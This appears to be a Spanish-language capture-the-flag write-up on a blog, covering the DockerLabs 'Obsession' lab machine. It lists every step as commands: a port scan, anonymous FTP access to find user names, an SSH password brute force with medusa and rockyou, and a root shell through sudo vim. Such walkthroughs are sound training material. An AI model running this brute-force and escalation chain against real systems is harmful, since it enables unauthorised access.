---
layout: post
title: "Obsession"
date: 2024-07-27 14:10:23
category: dockerlabs
vm: dockerlabs
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Obsession </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Muy Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/dockerlabs/obsession/host.png){:.margin}

**1\.** Escaneando los puertos de la maquina.

`sudo nmap -p- --open -T5 --min-rate=5000 -sS -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/obsession/nmap.png){:.margin}

**2\.** En la web podemos encontrar algunas pistas, por ejemplo podria tener el usuario russoski que se menciona en muchas partes.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/obsession/80.png){:.margin}
![img](/notas/public/img/dockerlabs/obsession/80code.png){:.margin}

**3\.** Accedo al ftp com anonymous, hay dos archivos los descargo y en uno de ellos se puede confirmar la existencia del usuario russoski y otra que es gonza. 

`ftp 172.17.0.2`

`dir`

`get chat-gonza.txt pendientes.txt`

`cat chat-gonza.txt`

![img](/notas/public/img/dockerlabs/obsession/ftp.png){:.margin}

![img](/notas/public/img/dockerlabs/obsession/cattxt.png){:.margin}

**4\.** Haciendo fuerza bruta al ssh usuario russoski.

`medusa -h 172.17.0.2 -u russoski -P /usr/share/wordlists/rockyou.txt -M ssh -t10 -f | grep SUCCESS`

![img](/notas/public/img/dockerlabs/obsession/medusa.png){:.margin}

**5\.** Me conecto por ssh como russoski.

`ssh russoski@172.17.0.2`

![img](/notas/public/img/dockerlabs/obsession/sshrussoski.png){:.margin}

**6\.** viendo los permisos sudo del usuario, veo que puedo ejecutar un binario como root.

`sudo -l`

![img](/notas/public/img/dockerlabs/obsession/sudol.png){:.margin}

**7\.** Obteniendo el usuario root,[gtfobins](https://gtfobins.github.io/gtfobins/vim/#sudo).

`sudo vim -c ':!/bin/sh'`

![img](/notas/public/img/dockerlabs/obsession/root.png){:.margin}


<br>

<a href="#">_Finalizado._</a>